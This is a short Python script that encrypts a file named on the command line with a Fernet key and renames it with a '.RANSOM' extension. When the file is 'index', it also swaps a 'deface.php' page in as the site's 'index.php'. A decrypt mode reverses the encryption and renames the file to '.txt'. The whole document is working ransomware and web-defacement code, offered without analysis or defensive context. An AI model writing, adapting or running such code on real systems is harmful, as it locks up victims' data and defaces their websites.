from cryptography.fernet import Fernet
import os
import sys

with open(sys.argv[2], 'rb') as filekey:
    key = filekey.read()
    
fernet = Fernet(key)

if sys.argv[1] == "-e":
    
    current_file = sys.argv[3]
    with open(current_file, 'rb') as file:
        original = file.read()

    encrypted = fernet.encrypt(original)

    with open(current_file, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

    base = os.path.splitext(current_file)[0]
    os.rename(current_file, base + '.RANSOM')
    
    # Need a way to change this back
    if base == "index":
        os.rename('deface.php', 'index.php')

elif sys.argv[1] == "-d":
    
    current_file = sys.argv[3]
    with open(current_file, 'rb') as enc_file:
        encrypted = enc_file.read()
        
    decrypted = fernet.decrypt(encrypted)
    
    with open(current_file, 'wb') as dec_file:
        dec_file.write(decrypted)
    
    base = os.path.splitext(current_file)[0]
    os.rename(current_file, base + '.txt')
